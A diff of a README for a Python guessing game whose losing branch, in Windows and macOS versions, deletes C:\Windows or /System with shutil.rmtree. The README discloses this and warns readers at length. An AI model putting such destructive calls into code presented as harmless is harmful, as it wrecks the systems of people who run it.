@@ -1,88 +1,140 @@
-# Silly Number Guessing Game 🎲
+# Risky Game
 
-A small Python number-guessing game where the player tries to guess a randomly generated number between **1 and 10**.
+A small Python guessing game with platform-specific versions for
+**Windows** and **macOS**.
 
-## How It Works
+> \[!WARNING\] **Do not run these scripts on a real computer.**
+>
+> Although the program presents itself as a simple number-guessing game,
+> the losing branch contains code that attempts to recursively delete a
+> critical operating-system directory:
+>
+> -   Windows version: `C:\Windows`
+> -   macOS version: `/System`
+>
+> This can cause severe system damage if the operation succeeds and
+> should only be inspected as example code in a safe, isolated
+> environment.
 
-1. The program generates a random number between 1 and 10.
-2. The player is asked to enter a guess.
-3. The guess is converted from text into an integer.
-4. If the guess matches the generated number, the program prints:
+## Files
 
-```text
-You Won!
+  -------------------------------------------------------------------------
+  File                      Platform                Description
+  ------------------------- ----------------------- -----------------------
+  `Risky_Game_windows.py`   Windows                 Number-guessing game
+                                                    with a Windows-specific
+                                                    destructive command
+
+  `Risky_Game_macOS.py`     macOS                   Number-guessing game
+                                                    with a macOS-specific
+                                                    destructive command
+  -------------------------------------------------------------------------
+
+## How the Game Works
+
+Both scripts follow the same basic flow:
+
+1.  Import Python's `random` module.
+2.  Generate a random integer between **1 and 10**.
+3.  Ask the player to guess the number.
+4.  Convert the player's input to an integer.
+5.  If the guess is correct, print `You Won!`.
+6.  If the guess is incorrect, execute a platform-specific filesystem
+    deletion command.
+
+The random number is generated with:
+
+``` python
+number = random.randint(1, 10)
 ```
 
-5. If the guess is incorrect, the program executes additional code.
+The user is then prompted with:
 
-## Requirements
-
-- Python 3.x
-
-No external Python packages are required for the random-number portion of the program.
-
-## Running the Game
-
-Run the following command from a terminal:
-
-```bash
-python silly_game.py
-```
-
-You will be prompted with:
-
-```text
+``` text
 Silly game! Guess number between 1 and 10:
 ```
 
-Enter a number between **1 and 10**.
+A correct guess results in:
 
-## ⚠️ Security Warning
-
-**Do not run this program on a real Windows computer.**
-
-The incorrect-guess branch imports Python's `shutil` module and calls:
-
-```python
-shutil.rmtree("C:\\Windows")
+``` text
+You Won!
 ```
 
-This attempts to recursively delete the Windows directory.
+The Windows script's losing branch imports `shutil` and calls:
 
-**This can seriously damage a Windows installation and may make the operating system unusable.**
-
-### Safe Version
-
-For a safe version of the game, the incorrect-guess branch should simply print a message such as:
-
-```python
-print("Wrong guess!")
+``` python
+shutil.rmtree("C:\Windows")
 ```
 
-> **Important:** Only run the original program in an isolated, disposable environment such as a properly configured virtual machine or sandbox if you are studying the destructive behavior. Never test it on a real Windows installation.
+The macOS script's losing branch calls:
 
-## Project Structure
-
-```text
-silly_game.py
-README.md
+``` python
+shutil.rmtree("/System")
 ```
 
-## Educational Purpose
+## Requirements
 
-This project demonstrates basic Python concepts, including:
+The scripts use Python's standard library modules, including:
 
-- Importing modules
-- Generating random numbers
-- Reading user input
-- Converting strings to integers
-- Conditional `if/else` statements
-- Calling functions from Python modules
+-   `random`
+-   `os`
+-   `shutil` (loaded only in the losing branch)
 
-## Disclaimer
+No third-party Python packages are required.
 
-This project contains intentionally destructive code in its incorrect-guess branch.
+## Usage
 
-**Do not execute the destructive branch on a real Windows system.**
+The scripts are intended to be run according to their target operating
+system:
 
-The destructive code is included for educational/security-awareness purposes only.
+``` bash
+python Risky_Game_windows.py
+```
+
+or:
+
+``` bash
+python Risky_Game_macOS.py
+```
+
+**However, do not execute either script on a normal Windows or macOS
+installation.** The losing branch is intentionally destructive.
+
+## Code Structure
+
+The core game logic is essentially:
+
+``` python
+number = random.randint(1, 10)
+
+guess = input("Silly game! Guess number between 1 and 10: ")
+guess = int(guess)
+
+if guess == number:
+    print("You Won!")
+else:
+    # Platform-specific destructive operation
+```
+
+The two files differ primarily in the target directory used by the
+losing branch.
+
+## Safety Notes
+
+This project should be treated as **unsafe demonstration code**, not as
+a normal game.
+
+If the goal is to learn Python conditionals, random numbers, and user
+input, the destructive branch should be replaced with a harmless action
+such as:
+
+``` python
+print("You Lost!")
+```
+
+A safe version would therefore behave like a normal guessing game
+without modifying the filesystem.
+
+## License
+
+No license is specified in the provided source files.
